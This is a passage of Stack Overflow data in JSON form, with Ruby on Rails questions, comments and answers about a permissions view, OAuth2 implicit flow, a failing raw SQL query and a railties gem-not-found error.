\"Users\"},\n    {subject_class: 'Users', action: 'update',name: 'Update User',description: 'nil', title: \"Users\"},\n    {subject_class: 'Users', action: 'destroy',name: 'Remove User',description: 'nil', title: \"Users\"},\n    {subject_class: 'Users', action: 'show',name: 'Show  User',description: 'nil', title: \"Users\"},\n\n    Role.first &lt;&lt; Permission.all\n</code></pre>\n\n<p>Subject Class is name of controller and action will be name of action.</p>\n\n<p>In the view you can load all role and permissions like below, I used accordion in my view, so you might need to update view as per your need</p>\n\n<pre><code> &lt;% roles = Role.includes(:permissions).all %&gt;                                    \n &lt;% uniq_controller = Permission.all.group_by { |p| p.title } %&gt;\n            &lt;div class=\"accordion panel-group\" id=\"accordion2\"&gt;\n              &lt;% uniq_controller.each do |permission| %&gt;\n\n                  &lt;div class=\"panel panel-default\"&gt;\n                    &lt;%= link_to \"##{permission.first}\" ,data: {parent: \"#accordion2\", toggle: \"collapse\"} do %&gt;\n                      &lt;div class=\"panel-heading\"&gt;\n                          &lt;h3 class=\"panel-title\"&gt;\n                             &lt;%= permission.first.gsub(\"_\",\" \") %&gt;\n                          &lt;/h3&gt;\n                      &lt;/div&gt;\n                    &lt;% end %&gt;\n                    &lt;div id=\"&lt;%= permission.first %&gt;\" class=\"panel-collapse collapse\"&gt;\n                      &lt;div class=\"collapse show\" role=\"tabpanel\" aria-labelledby=\"headingOne\"&gt;\n                        &lt;div class=\"card-block\"&gt;\n                          &lt;table&gt;\n                            &lt;% permission.second.each do |cont| %&gt;\n\n\n                                &lt;tr&gt;\n                                  &lt;td&gt;&lt;%= cont.name %&gt;&lt;/td&gt;\n                                  &lt;td&gt;\n                                    &lt;%= f.check_box :permission_ids, {multiple: true}, cont.id, nil %&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n\n                            &lt;% end %&gt;\n                          &lt;/table&gt;\n                        &lt;/div&gt;\n                      &lt;/div&gt;\n                    &lt;/div&gt;\n                  &lt;/div&gt;\n              &lt;% end %&gt;\n            &lt;/div&gt;\n</code></pre>\n\n<p>In the controller just add the <code>permission_ids: []</code> in permit parameters</p>\n"}], "owner": {"reputation": 63, "user_id": 9281878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qef8x.jpg?s=128&g=1", "display_name": "AksharaDL", "link": "https://stackoverflow.com/users/9281878/aksharadl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 62, "favorite_count": 0, "accepted_answer_id": 52052469, "answer_count": 1, "score": -2, "last_activity_date": 1535465121, "creation_date": 1535440210, "last_edit_date": 1535465121, "question_id": 52052027, "link": "https://stackoverflow.com/questions/52052027/issues-in-getting-ui-in-proper-format-using-ruby-on-rails", "title": "Issues in getting UI in proper format using ruby on rails", "body": "<p>I am working on a Ruby on rails project. I want to get this UI format:</p>\n\n<p><a href=\"https://i.stack.imgur.com/09yZH.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/09yZH.jpg\" alt=\"enter image description here\"></a></p>\n\n<p>I tried the below code, but not getting proper results. User can create controller dynamically from permission so the controller can be anything (User,Role,Permission etc)</p>\n\n<p><strong>Controller</strong></p>\n\n<pre><code>def display\n  param = params[:role]\n  id=param[:id] \n  @permission = Role\n                   .joins(:permissions)\n                   .where('roles.id=?',id)\n                   .select('permissions.*')\n\nend\n</code></pre>\n\n<p><strong>result of @permission</strong> </p>\n\n<pre><code>[#&lt;Role id: 4, name: \"index\", controller: \"User\", created_at: \"2018-08-21 \n06:29:47\", updated_at: \"2018-08-24 06:39:37\"&gt;, \n#&lt;Role id: 16, name: \"create\", controller: : \"User\", created_at: \"2018-08-24 \n07:11:08\", updated_at: \"2018-08-24 07:11:08\"&gt;, \n#&lt;Role id: 21, name: \"destroy\", controller: : \"User\", created_at: \"2018-08- \n24 07:31:17\", updated_at: \"2018-08-24 07:31:17\"&gt;,\n#&lt;Role id: 25, name: \"update\", controller: : \"User\", created_at: \"2018-08-24 \n07:52:00\", updated_at: \"2018-08-24 07:52:00\"&gt;,\n#&lt;Role id: 26, name: \"edit\", controller: : \"Role\", created_at: \"2018-08-27 \n06:38:39\", updated_at: \"2018-08-27 06:38:39\"&gt;]&gt;\n</code></pre>\n\n<p><strong>view</strong> </p>\n\n<pre><code>&lt;%= link_to 'Create',  new_permission_path %&gt;\n&lt;br/&gt;\n&lt;thead&gt;\n&lt;tr&gt;\n  &lt;th width=\"25px\"&gt;&lt;%= \"User\" %&gt;&lt;/th&gt;\n &lt;/tr&gt;\n &lt;tr&gt;\n &lt;% @permission.each do |p| %&gt;\n &lt;%  if (p.controller== 'User') %&gt;\n  &lt;th width=\"25px\"&gt; &lt;%= check_box_tag \"p[]\", p.id %&gt; &lt;%= p.name %&gt;&lt;/th&gt;\n &lt;% end %&gt;\n &lt;% end %&gt;\n &lt;/tr&gt;\n &lt;/thead&gt;\n</code></pre>\n"}, {"tags": ["ruby", "oauth-2.0"], "comments": [{"owner": {"reputation": 1236, "user_id": 2061624, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sEGQV.jpg?s=128&g=1", "display_name": "Franck Gamess", "link": "https://stackoverflow.com/users/2061624/franck-gamess"}, "edited": false, "score": 0, "creation_date": 1535440487, "post_id": 52051983, "comment_id": 91054341, "body": "Welcome to stackoverflow. Can you please expose clearly your question/issue in the body not only in the title. Please read <a href=\"https://stackoverflow.com/help/how-to-ask\">stackoverflow.com/help/how-to-ask</a> Thanks"}, {"owner": {"reputation": 1, "user_id": 8567451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8f252de1f22b0b4942148032bfd45bc?s=128&d=identicon&r=PG&f=1", "display_name": "Leigh", "link": "https://stackoverflow.com/users/8567451/leigh"}, "reply_to_user": {"reputation": 1236, "user_id": 2061624, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sEGQV.jpg?s=128&g=1", "display_name": "Franck Gamess", "link": "https://stackoverflow.com/users/2061624/franck-gamess"}, "edited": false, "score": 0, "creation_date": 1535440892, "post_id": 52051983, "comment_id": 91054570, "body": "Thank you. I&#39;m unable to edit my question, maybe because I&#39;m new... would you be able to edit for me? or point me in the right direction."}, {"owner": {"reputation": 469137, "user_id": 476, "user_type": "moderator", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a235706e3d81b614acaec3368edfea4b?s=128&d=identicon&r=PG", "display_name": "deceze", "link": "https://stackoverflow.com/users/476/deceze"}, "edited": false, "score": 0, "creation_date": 1535441613, "post_id": 52051983, "comment_id": 91055015, "body": "Why can&#39;t the user use the ruby library to drive an authentication process\u2026?!"}, {"owner": {"reputation": 697, "user_id": 4419613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d29b56b3627f860af3f1a8c6edb3921?s=128&d=identicon&r=PG&f=1", "display_name": "Boaz", "link": "https://stackoverflow.com/users/4419613/boaz"}, "edited": false, "score": 0, "creation_date": 1535460864, "post_id": 52051983, "comment_id": 91067003, "body": "You are right that It&#39;s <a href=\"https://oauth.net/2/grant-types/implicit\" rel=\"nofollow noreferrer\">not recommended</a> but if it&#39;s done correctly (mostly with client SDK) it can be safe. <a href=\"https://developers.google.com/identity/protocols/OAuth2UserAgent\" rel=\"nofollow noreferrer\">Google</a> and <a href=\"https://developers.facebook.com/docs/facebook-login/web\" rel=\"nofollow noreferrer\">Facebook</a> are doing it."}, {"owner": {"reputation": 1, "user_id": 8567451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8f252de1f22b0b4942148032bfd45bc?s=128&d=identicon&r=PG&f=1", "display_name": "Leigh", "link": "https://stackoverflow.com/users/8567451/leigh"}, "reply_to_user": {"reputation": 469137, "user_id": 476, "user_type": "moderator", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a235706e3d81b614acaec3368edfea4b?s=128&d=identicon&r=PG", "display_name": "deceze", "link": "https://stackoverflow.com/users/476/deceze"}, "edited": false, "score": 0, "creation_date": 1535496139, "post_id": 52051983, "comment_id": 91084534, "body": "@deceze because using implicit flow (grant) is not intended for server-side."}, {"owner": {"reputation": 1, "user_id": 8567451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8f252de1f22b0b4942148032bfd45bc?s=128&d=identicon&r=PG&f=1", "display_name": "Leigh", "link": "https://stackoverflow.com/users/8567451/leigh"}, "reply_to_user": {"reputation": 697, "user_id": 4419613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d29b56b3627f860af3f1a8c6edb3921?s=128&d=identicon&r=PG&f=1", "display_name": "Boaz", "link": "https://stackoverflow.com/users/4419613/boaz"}, "edited": false, "score": 0, "creation_date": 1535496871, "post_id": 52051983, "comment_id": 91084730, "body": "Maybe they could say in the readme. Implicit flow is intended for client-side apps and it&#39;s not recommended even then. But we have it anyway and you can use it and the link you provided @Boaz"}, {"owner": {"reputation": 469137, "user_id": 476, "user_type": "moderator", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a235706e3d81b614acaec3368edfea4b?s=128&d=identicon&r=PG", "display_name": "deceze", "link": "https://stackoverflow.com/users/476/deceze"}, "edited": false, "score": 0, "creation_date": 1535522613, "post_id": 52051983, "comment_id": 91090621, "body": "@Leigh Who says this library must exclusively be used server side?"}, {"owner": {"reputation": 1, "user_id": 8567451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8f252de1f22b0b4942148032bfd45bc?s=128&d=identicon&r=PG&f=1", "display_name": "Leigh", "link": "https://stackoverflow.com/users/8567451/leigh"}, "reply_to_user": {"reputation": 469137, "user_id": 476, "user_type": "moderator", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a235706e3d81b614acaec3368edfea4b?s=128&d=identicon&r=PG", "display_name": "deceze", "link": "https://stackoverflow.com/users/476/deceze"}, "edited": false, "score": 0, "creation_date": 1535585241, "post_id": 52051983, "comment_id": 91124990, "body": "@deceze When using the implicit flow a server is not required, so it was used for javascript apps. OAuth says it, I&#39;m not saying the entire library, I&#39;m saying part of the library."}, {"owner": {"reputation": 469137, "user_id": 476, "user_type": "moderator", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a235706e3d81b614acaec3368edfea4b?s=128&d=identicon&r=PG", "display_name": "deceze", "link": "https://stackoverflow.com/users/476/deceze"}, "edited": false, "score": 0, "creation_date": 1535610066, "post_id": 52051983, "comment_id": 91130545, "body": "Ok, wait\u2026 your assumption seems to be that implicit flow is a client-side thing, and Ruby is a server-side language, so why does a Ruby library support it? Right? I\u2019m trying to tell you that the assumption that Ruby is purely a server-side language is wrong, and that there\u2019s no reason why a client-side Ruby program mightn\u2019t want to use implicit flow. And so it makes perfect sense for the library to support it for completeness."}], "owner": {"reputation": 1, "user_id": 8567451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8f252de1f22b0b4942148032bfd45bc?s=128&d=identicon&r=PG&f=1", "display_name": "Leigh", "link": "https://stackoverflow.com/users/8567451/leigh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 71, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1535463469, "creation_date": 1535440046, "last_edit_date": 1535463469, "question_id": 52051983, "link": "https://stackoverflow.com/questions/52051983/why-is-oauth2-implicit-flow-supported-in-a-recommended-ruby-library", "title": "Why is OAuth2 implicit flow supported in a recommended Ruby library?", "body": "<p>My understanding is implicit flow should only be used if the client is being driven by the user who owns the data. Because there is no server acting on behalf of the user there is no need to send a code back to exchange for a token.</p>\n\n<p>The Ruby library is OAuth-xx/oauth2 and it allows me to do implicit which feels wrong. It seems like it is a recommended Ruby library. So why is Auth2 implicit flow supported?</p>\n\n<p>I'll use another method, as there are other ways. It's just something I'd like to know, to fill a hole in my understanding.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "postgresql", "rails-activerecord", "pg"], "comments": [{"owner": {"reputation": 9921, "user_id": 488195, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/aa1e7477ba2f6c0ec47ed521f1cf1676?s=128&d=identicon&r=PG", "display_name": "dgilperez", "link": "https://stackoverflow.com/users/488195/dgilperez"}, "edited": false, "score": 2, "creation_date": 1535440048, "post_id": 52051924, "comment_id": 91054110, "body": "Well, you have a syntax error. Can you post exactly the commands you&#39;re using? Where you define <code>sql</code>. If that&#39;s the first one, then please format it properly to be valid ruby syntax (quotes and so)"}, {"owner": {"reputation": 43, "user_id": 7641238, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FJm3z_b87V0/AAAAAAAAAAI/AAAAAAAAAAo/Tl7_So5zKC8/photo.jpg?sz=128", "display_name": "cop", "link": "https://stackoverflow.com/users/7641238/cop"}, "reply_to_user": {"reputation": 9921, "user_id": 488195, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/aa1e7477ba2f6c0ec47ed521f1cf1676?s=128&d=identicon&r=PG", "display_name": "dgilperez", "link": "https://stackoverflow.com/users/488195/dgilperez"}, "edited": false, "score": 0, "creation_date": 1535440208, "post_id": 52051924, "comment_id": 91054186, "body": "sql is ofcourse a string with double quotes. I have edited in the question. However, i &#39;m still getting error"}, {"owner": {"reputation": 9921, "user_id": 488195, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/aa1e7477ba2f6c0ec47ed521f1cf1676?s=128&d=identicon&r=PG", "display_name": "dgilperez", "link": "https://stackoverflow.com/users/488195/dgilperez"}, "edited": false, "score": 0, "creation_date": 1535440236, "post_id": 52051924, "comment_id": 91054199, "body": "What&#39;s the <code>rs.params#&gt;&gt;&#39;{last_call_Trip Enquiry_1, outcome}&#39;</code> part? Also, did you try removing the alias and using <code>external_verification_responses.created_at</code> instead?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 1, "creation_date": 1535440292, "post_id": 52051924, "comment_id": 91054238, "body": "To diagnose it would you mind to try it with <code>sql = &quot;select rs.created_at from external_verification_responses rs limit 1&quot;</code>?"}, {"owner": {"reputation": 1, "user_id": 10093230, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c3c68a5c9db99c279c2e5d488fb5269?s=128&d=identicon&r=PG&f=1", "display_name": "Lavanya", "link": "https://stackoverflow.com/users/10093230/lavanya"}, "edited": false, "score": 0, "creation_date": 1535440384, "post_id": 52051924, "comment_id": 91054286, "body": "Please refer the link &lt;<a href=\"https://stackoverflow.com/questions/14824453/rails-raw-sql-example\" title=\"rails raw sql example\">stackoverflow.com/questions/14824453/rails-raw-sql-example</a>&gt;&zwnj;&#8203;. U will find solution."}, {"owner": {"reputation": 43, "user_id": 7641238, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FJm3z_b87V0/AAAAAAAAAAI/AAAAAAAAAAo/Tl7_So5zKC8/photo.jpg?sz=128", "display_name": "cop", "link": "https://stackoverflow.com/users/7641238/cop"}, "reply_to_user": {"reputation": 9921, "user_id": 488195, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/aa1e7477ba2f6c0ec47ed521f1cf1676?s=128&d=identicon&r=PG", "display_name": "dgilperez", "link": "https://stackoverflow.com/users/488195/dgilperez"}, "edited": false, "score": 0, "creation_date": 1535440568, "post_id": 52051924, "comment_id": 91054393, "body": "@dgilperez this part is json query, as said it runs fine on sql clients. I also tried without alias but same error"}, {"owner": {"reputation": 43, "user_id": 7641238, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FJm3z_b87V0/AAAAAAAAAAI/AAAAAAAAAAo/Tl7_So5zKC8/photo.jpg?sz=128", "display_name": "cop", "link": "https://stackoverflow.com/users/7641238/cop"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535440948, "post_id": 52051924, "comment_id": 91054604, "body": "@mudasobwa This short sql works, however breaks on inner join"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 1, "user_id": 10093230, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c3c68a5c9db99c279c2e5d488fb5269?s=128&d=identicon&r=PG&f=1", "display_name": "Lavanya", "link": "https://stackoverflow.com/users/10093230/lavanya"}, "edited": false, "score": 0, "creation_date": 1535440977, "post_id": 52051924, "comment_id": 91054621, "body": "@LavanyaAnanya how is the linked answer relevant?"}, {"owner": {"reputation": 43, "user_id": 7641238, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FJm3z_b87V0/AAAAAAAAAAI/AAAAAAAAAAo/Tl7_So5zKC8/photo.jpg?sz=128", "display_name": "cop", "link": "https://stackoverflow.com/users/7641238/cop"}, "edited": false, "score": 1, "creation_date": 1535443213, "post_id": 52051924, "comment_id": 91055893, "body": "GUYS, as it turns out, there could have been a special character impersonating space character in the query as I was copying the query directly from sql client(postico) into rails console. When I typed the query all by myself it worked. Thanks for your support"}], "owner": {"reputation": 43, "user_id": 7641238, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FJm3z_b87V0/AAAAAAAAAAI/AAAAAAAAAAo/Tl7_So5zKC8/photo.jpg?sz=128", "display_name": "cop", "link": "https://stackoverflow.com/users/7641238/cop"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 2387, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1537215521, "creation_date": 1535439784, "last_edit_date": 1537215521, "question_id": 52051924, "link": "https://stackoverflow.com/questions/52051924/run-a-raw-sql-query-in-rails", "title": "Run a raw sql query in Rails", "body": "<p>The following query runs fine on a postgres client (postico):</p>\n\n<pre><code>sql = \"select\u00a0rs.created_at, lv.id\nfrom\u00a0external_verification_responses rs\ninner\u00a0join\u00a0external_verification_requests rq\u00a0on\u00a0rs.external_verification_request_id\u00a0= rq.id\ninner\u00a0join\u00a0leave_verifications lv\u00a0on\u00a0lv.id = rq.request_id\nWHERE (rs.params#&gt;&gt;'{last_call_Trip Enquiry_1, outcome}' = 'Interested') AND (date(rs.created_at) &gt;= '2018-08-21')\nORDER BY rs.created_at DESC\"\n</code></pre>\n\n<p>However, with rails, it breaks</p>\n\n<pre><code>records_array = ActiveRecord::Base.connection.execute(sql)\n</code></pre>\n\n<p>The error is:</p>\n\n<pre><code>ActiveRecord::StatementInvalid: PG::SyntaxError: ERROR:  syntax error at or near \"select\u00a0rs\"\nLINE 1: select\u00a0rs.created_at, lv.id from\u00a0external_verification_respo...\n</code></pre>\n\n<p>If defining alias is a problem in rails raw sql query, then how do I define alias in my query?</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 1, "creation_date": 1535436454, "post_id": 52051122, "comment_id": 91052401, "body": "try <code>gem install bundler</code> , then <code>bundle</code>"}, {"owner": {"reputation": 185, "user_id": 9030906, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-HZvE1tAtOSY/AAAAAAAAAAI/AAAAAAAABTY/kcbGEdtr2og/photo.jpg?sz=128", "display_name": "Vivank Sharma", "link": "https://stackoverflow.com/users/9030906/vivank-sharma"}, "reply_to_user": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535436509, "post_id": 52051122, "comment_id": 91052414, "body": "tried <code>sudo gem install bundler</code> and then <code>bundle</code> still the same issue @Vishal"}, {"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535437257, "post_id": 52051122, "comment_id": 91052745, "body": "did you tried <code>gem install rails</code> ?"}, {"owner": {"reputation": 185, "user_id": 9030906, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-HZvE1tAtOSY/AAAAAAAAAAI/AAAAAAAABTY/kcbGEdtr2og/photo.jpg?sz=128", "display_name": "Vivank Sharma", "link": "https://stackoverflow.com/users/9030906/vivank-sharma"}, "reply_to_user": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535437362, "post_id": 52051122, "comment_id": 91052789, "body": "trying now @Vishal what after installing it ?"}, {"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535437489, "post_id": 52051122, "comment_id": 91052850, "body": "<code>gem install bundler</code> and <code>bundle install</code> ?"}, {"owner": {"reputation": 185, "user_id": 9030906, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-HZvE1tAtOSY/AAAAAAAAAAI/AAAAAAAABTY/kcbGEdtr2og/photo.jpg?sz=128", "display_name": "Vivank Sharma", "link": "https://stackoverflow.com/users/9030906/vivank-sharma"}, "reply_to_user": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535437638, "post_id": 52051122, "comment_id": 91052916, "body": "now rails-v is working perfectly but even now on bundle install it&#39;s saying could not locate gem file"}, {"owner": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535438203, "post_id": 52051122, "comment_id": 91053188, "body": "What is the output you see for <code>rails -v</code> ? and which directory are you in when you&#39;re running <code>bundle install</code>. You should be inside the <code>app</code> directory."}, {"owner": {"reputation": 185, "user_id": 9030906, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-HZvE1tAtOSY/AAAAAAAAAAI/AAAAAAAABTY/kcbGEdtr2og/photo.jpg?sz=128", "display_name": "Vivank Sharma", "link": "https://stackoverflow.com/users/9030906/vivank-sharma"}, "reply_to_user": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535438439, "post_id": 52051122, "comment_id": 91053309, "body": "Got it thanks @KedarnagMukanahallipatna it solved my problem"}], "answers": [{"tags": [], "owner": {"reputation": 973, "user_id": 9989384, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/530602201f9551563176b0b648b7d50b?s=128&d=identicon&r=PG&f=1", "display_name": "Cryptex Technologies", "link": "https://stackoverflow.com/users/9989384/cryptex-technologies"}, "is_accepted": true, "score": 9, "last_activity_date": 1535438991, "creation_date": 1535438991, "answer_id": 52051721, "question_id": 52051122, "link": "https://stackoverflow.com/questions/52051122/cant-find-gem-railties-0-a-with-executable-rails-gemgemnotfoundexceptio/52051721#52051721", "title": "Can&#39;t find gem railties (&gt;= 0.a) with executable rails (Gem::GemNotFoundException)", "body": "<p>try to run \n<code>gem install bundler</code>\nthen run <code>bundle</code></p>\n\n<p>if you still getting the error then run,</p>\n\n<pre><code>bundle install --path vendor/bundle\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5850, "user_id": 4501354, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/1230cfcc7f68488ad19d0022cf7b1a93?s=128&d=identicon&r=PG&f=1", "display_name": "Donato", "link": "https://stackoverflow.com/users/4501354/donato"}, "is_accepted": false, "score": 5, "last_activity_date": 1549663120, "creation_date": 1549663120, "answer_id": 54600817, "question_id": 52051122, "link": "https://stackoverflow.com/questions/52051122/cant-find-gem-railties-0-a-with-executable-rails-gemgemnotfoundexceptio/54600817#54600817", "title": "Can&#39;t find gem railties (&gt;= 0.a) with executable rails (Gem::GemNotFoundException)", "body": "<p>This will most likely happen when you try to install a gem without specifying a version of that gem against an older ruby version. The gem will attempt to install a newer version, meanwhile you are using an incompatible ruby version. So let's use Rails as an example. Let's say you are using an older Ruby version, such as 2.1. Then you cannot install the latest version of Rails. You would have to install an older version like Rails 4:</p>\n\n<pre><code>rvm-prompt\nruby-2.1.2\nrvm gemset create validations_test\nrvm use @validations_test\n</code></pre>\n\n<p>Install a version of bundler that works with the ruby version:</p>\n\n<pre><code>gem install bundler -v 1.17.3\n</code></pre>\n\n<p>Install Rails 4 which will work with Ruby 2.1:</p>\n\n<pre><code>gem install rails -v 4.2\n</code></pre>\n\n<p>Nokogiri will probably fail installing. So it will prompt you to install an older version of nokogiri:</p>\n\n<pre><code>gem install nokogiri -v 1.9.1\n</code></pre>\n\n<p>Now finish installing Rails (since Nokogiri would have haulted the completion of all the gems that need to be installed for Rails 4):</p>\n\n<pre><code>gem install rails -v 4.2\n</code></pre>\n\n<p>Now make sure when you create a new project, you are using Rails 4:</p>\n\n<pre><code>rails _4.2_ new validations_test \n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 129, "user_id": 661659, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7799ed4ed899f361f5604d92aab53888?s=128&d=identicon&r=PG", "display_name": "Kingdon", "link": "https://stackoverflow.com/users/661659/kingdon"}, "edited": false, "score": 1, "creation_date": 1594086372, "post_id": 58049648, "comment_id": 110996369, "body": "thank you, this solved it for me! &quot;rails&quot; binstub in /usr/local which was very hard to track down, although my environment is RVM, I had the same error as top post exactly."}], "tags": [], "owner": {"reputation": 311, "user_id": 7292776, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-X5noq26VPcQ/AAAAAAAAAAI/AAAAAAAAAgA/cWtPXan-Ofg/photo.jpg?sz=128", "display_name": "Shekhar Patil", "link": "https://stackoverflow.com/users/7292776/shekhar-patil"}, "is_accepted": false, "score": 1, "last_activity_date": 1569158729, "creation_date": 1569158729, "answer_id": 58049648, "question_id": 52051122, "link": "https://stackoverflow.com/questions/52051122/cant-find-gem-railties-0-a-with-executable-rails-gemgemnotfoundexceptio/58049648#58049648", "title": "Can&#39;t find gem railties (&gt;= 0.a) with executable rails (Gem::GemNotFoundException)", "body": "<ol>\n<li>You should have a ruby version above 2.5.0</li>\n<li>Then run the command:  <code>gem update</code></li>\n<li>now create a new application.</li>\n</ol>\n"}, {"tags": [], "owner": {"reputation": 41, "user_id": 7127907, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-zf3pKhjM3lE/AAAAAAAAAAI/AAAAAAAAAiw/8WXVPZvsCp8/photo.jpg?sz=128", "display_name": "bpaysen", "link": "https://stackoverflow.com/users/7127907/bpaysen"}, "is_accepted": false, "score": 4, "last_activity_date": 1581367580, "creation_date": 1581367580, "answer_id": 60158157, "question_id": 52051122, "link": "https://stackoverflow.com/questions/52051122/cant-find-gem-railties-0-a-with-executable-rails-gemgemnotfoundexceptio/60158157#60158157", "title": "Can&#39;t find gem railties (&gt;= 0.a) with executable rails (Gem::GemNotFoundException)", "body": "<p>I got the same error while creating a new gemset and querying the rails version. In my case, I simply had not installed the rails gem yet.<br>\nI just needed to do the following:</p>\n\n<p>for a current stable release:<br>\n<code>$ gem install rails</code> </p>\n\n<p>to get a specific version, say 5.2.2.0:<br>\n <code>gem install rails --version=5.2.2.0</code>  </p>\n\n<p>Hope that helps.</p>\n"}, {"tags": [], "owner": {"reputation": 2558, "user_id": 1157242, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a9d4b10e0b35be38592bed9e4e5457e3?s=128&d=identicon&r=PG", "display_name": "PJSCopeland", "link": "https://stackoverflow.com/users/1157242/pjscopeland"}, "is_accepted": false, "score": 3, "last_activity_date": 1587440929, "creation_date": 1587440929, "answer_id": 61335628, "question_id": 52051122, "link": "https://stackoverflow.com/questions/52051122/cant-find-gem-railties-0-a-with-executable-rails-gemgemnotfoundexceptio/61335628#61335628", "title": "Can&#39;t find gem railties (&gt;= 0.a) with executable rails (Gem::GemNotFoundException)", "body": "<p>My only problem was that I needed to run <code>rails</code> with <code>bundle exec</code>.</p>\n\n<pre><code>% rails g --help; echo $?\n...\ncan't find gem railties (&gt;= 0.a) with executable rails 